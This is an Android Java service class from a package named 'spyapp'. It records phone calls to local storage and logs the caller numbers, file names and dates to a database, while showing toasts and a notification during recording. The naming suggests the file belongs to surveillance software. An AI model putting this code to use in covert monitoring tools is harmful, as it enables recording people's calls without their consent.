package com.app.spyapp.service;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;
import android.widget.Toast;

import com.app.spyapp.R;
import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Utils;
import com.app.spyapp.common.WriteLog;
import com.app.spyapp.model.CallRecordModel;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

//import java.security.KeyPairGenerator;
//import java.security.KeyPair;
//import java.security.Key;

public class RecordService
        extends Service
        implements MediaRecorder.OnInfoListener, MediaRecorder.OnErrorListener {
    private static final String TAG = "CallRecorder";

    public static final String DEFAULT_STORAGE_LOCATION = Utils.getPathofFiles() + "/callrecorder";
    private static final int RECORDING_NOTIFICATION_ID = 1;

    private MediaRecorder recorder = null;
    private boolean isRecording = false;
    private File recording = null;
    ;
    private SpyApp spyApp;
//    int audiosource = Const.AUDIO_SOURCE;
//    int audioformat = Const.AUDIO_FORMAT;


    private File makeOutputFile() {
        File dir = new File(DEFAULT_STORAGE_LOCATION);

        // test dir for existence and writeability
        if (!dir.exists()) {
            try {
                dir.mkdirs();
            } catch (Exception e) {
                WriteLog.E("CallRecorder", "RecordService::makeOutputFile unable to create directory " + dir + ": " + e);
                Toast t = Toast.makeText(getApplicationContext(), "CallRecorder was unable to create the directory " + dir + " to store recordings: " + e, Toast.LENGTH_LONG);
                t.show();
                return null;
            }
        } else {
            if (!dir.canWrite()) {
                WriteLog.E(TAG, "RecordService::makeOutputFile does not have write permission for directory: " + dir);
                Toast t = Toast.makeText(getApplicationContext(), "CallRecorder does not have write permission for the directory directory " + dir + " to store recordings", Toast.LENGTH_LONG);
                t.show();
                return null;
            }
        }

        // test size

        // create filename based on call data
        //String prefix = "call";
        SimpleDateFormat sdf = new SimpleDateFormat(Const.DATEFORMATE);
        String prefix = sdf.format(new Date());

        // add info to file name about what audio channel we were recording

        // Audio Source

//        MIC-1 VOICE_CALL- 4  VOICE_UPLINK-2 VOICE_DOWNLINK-3

        prefix += "-channel" + Const.AUDIO_SOURCE + "-";

        // create suffix based on format
        String suffix = "";
        switch (Const.AUDIO_FORMAT) {
            case MediaRecorder.OutputFormat.THREE_GPP:
                suffix = ".3gpp";
                break;
            case MediaRecorder.OutputFormat.MPEG_4:
                suffix = ".mpg";
                break;
            case MediaRecorder.OutputFormat.RAW_AMR:
                suffix = ".amr";
                break;
        }

        try {
            return File.createTempFile(prefix, suffix, dir);
        } catch (IOException e) {
            Log.e("CallRecorder", "RecordService::makeOutputFile unable to create temp file in " + dir + ": " + e);
            Toast t = Toast.makeText(getApplicationContext(), "CallRecorder was unable to create temp file in " + dir + ": " + e, Toast.LENGTH_LONG);
            t.show();
            return null;
        }
    }

    public void onCreate() {
        super.onCreate();
        recorder = new MediaRecorder();
        WriteLog.E("CallRecorder", "onCreate created MediaRecorder object");
    }

    public void onStart(Intent intent, int startId) {
        //}

        //public int onStartCommand(Intent intent, int flags, int startId)
        //{
        WriteLog.E("CallRecorder", "RecordService::onStartCommand called while isRecording:" + isRecording);

        if (isRecording) return;

        Context c = getApplicationContext();
        spyApp = (SpyApp) c;
        String incomingnumber = "";
        if (intent.getExtras() != null) {
            incomingnumber = intent.getExtras().getString("INCOMINGNUMBER");
        }

        recording = makeOutputFile();
        if (recording == null) {
            recorder = null;
            return; //return 0;
        }

        WriteLog.E("CallRecorder", "RecordService will config MediaRecorder with audiosource: " + Const.AUDIO_SOURCE + " audioformat: " + Const.AUDIO_FORMAT);
        try {
            // These calls will throw exceptions unless you set the 
            // android.permission.RECORD_AUDIO permission for your app
            recorder.reset();
//            recorder.setAudioSource(audiosource);
//            Log.d("CallRecorder", "set audiosource " + audiosource);
//            recorder.setOutputFormat(audioformat);
//            Log.d("CallRecorder", "set output " + audioformat);
//            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
//            Log.d("CallRecorder", "set encoder default");

            recorder.setAudioSource(Const.AUDIO_SOURCE);
            recorder.setOutputFormat(Const.AUDIO_FORMAT);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

            recorder.setOutputFile(recording.getAbsolutePath());
            WriteLog.E("CallRecorder", "set file: " + recording);
            //recorder.setMaxDuration(msDuration); //1000); // 1 seconds
            //recorder.setMaxFileSize(bytesMax); //1024*1024); // 1KB

            CallRecordModel callRecordModel = new CallRecordModel();
            callRecordModel.setIncomingnumber(incomingnumber);
            callRecordModel.setOutgoingnumber(spyApp.getOutgoingnumber());
            callRecordModel.setFilename(recording.getName());
            callRecordModel.setFilepath(recording.getPath());
            callRecordModel.setRecorddate(Utils.convertMilisToDate(Calendar.getInstance().getTimeInMillis()));
            spyApp.getDatabaseHelper().insertCallRecord(callRecordModel);
            recorder.setOnInfoListener(this);
            recorder.setOnErrorListener(this);

            try {
                recorder.prepare();
            } catch (IOException e) {
                Log.e("CallRecorder", "RecordService::onStart() IOException attempting recorder.prepare()\n");
                Toast t = Toast.makeText(getApplicationContext(), "CallRecorder was unable to start recording: " + e, Toast.LENGTH_LONG);
                t.show();
                recorder = null;
                return; //return 0; //START_STICKY;
            }
            WriteLog.E("CallRecorder", "recorder.prepare() returned");

            recorder.start();
            isRecording = true;
            Log.i("CallRecorder", "recorder.start() returned");
            updateNotification(true);
        } catch (Exception e) {
            Toast t = Toast.makeText(getApplicationContext(), "CallRecorder was unable to start recording: " + e, Toast.LENGTH_LONG);
            t.show();

            WriteLog.E("CallRecorder", "RecordService::onStart caught unexpected exception");
            recorder = null;
        }

        return; //return 0; //return START_STICKY;
    }

    public void onDestroy() {
        super.onDestroy();

        if (null != recorder) {
            WriteLog.E("CallRecorder", "RecordService::onDestroy calling recorder.release()");
            isRecording = false;
            recorder.release();
            Toast t = Toast.makeText(getApplicationContext(), "CallRecorder finished recording call to " + recording, Toast.LENGTH_LONG);
            t.show();
        }

        updateNotification(false);
    }


    // methods to handle binding the service

    public IBinder onBind(Intent intent) {
        return null;
    }

    public boolean onUnbind(Intent intent) {
        return false;
    }

    public void onRebind(Intent intent) {
    }


    private void updateNotification(Boolean status) {
        Context c = getApplicationContext();
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(c);

        String ns = Context.NOTIFICATION_SERVICE;
        NotificationManager mNotificationManager = (NotificationManager) getSystemService(ns);

        if (status) {
            int icon = R.drawable.ic_cast_on_light;
            CharSequence tickerText = "Recording call from channel " + Const.AUDIO_SOURCE;
            long when = System.currentTimeMillis();

            Notification notification = new Notification(icon, tickerText, when);

            Context context = getApplicationContext();
            CharSequence contentTitle = "CallRecorder Status";
            CharSequence contentText = "Recording call from channel...";
            Intent notificationIntent = new Intent(this, RecordService.class);
            PendingIntent contentIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);

            notification.setLatestEventInfo(context, contentTitle, contentText, contentIntent);
            mNotificationManager.notify(RECORDING_NOTIFICATION_ID, notification);
        } else {
            mNotificationManager.cancel(RECORDING_NOTIFICATION_ID);
        }
    }

    // MediaRecorder.OnInfoListener
    public void onInfo(MediaRecorder mr, int what, int extra) {
        WriteLog.E("CallRecorder", "RecordService got MediaRecorder onInfo callback with what: " + what + " extra: " + extra);
        isRecording = false;
    }

    // MediaRecorder.OnErrorListener
    public void onError(MediaRecorder mr, int what, int extra) {
        WriteLog.E("CallRecorder", "RecordService got MediaRecorder onError callback with what: " + what + " extra: " + extra);
        isRecording = false;
        mr.release();
    }
}
